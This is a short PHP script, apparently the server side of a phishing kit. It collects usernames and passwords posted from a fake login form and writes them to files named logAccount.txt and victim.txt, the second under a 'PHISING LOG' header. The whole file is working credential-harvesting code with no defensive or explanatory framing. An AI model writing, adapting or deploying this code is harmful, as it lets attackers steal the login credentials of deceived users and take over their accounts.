<?php
	if (!empty($_POST["user"])){
		if (!empty($_POST["pass"])){
			$f=fopen("logAccount.txt","a+");
			$a=fopen("victim.txt","w");
			fwrite($f,"[=] Email: ".$_POST["user"]."\n[=] Pass: ".$_POST["pass"]."\n");
			fwrite($a,"\r[+] PHISING LOG\n\r[=] Email: ".$_POST["email"]."\n\r[=] Passs: ".$_POST["pass"]);
			fclose($f);
			fclose($a);
		}else{
			exit();
		}
	}else{
		exit();
	}
?>
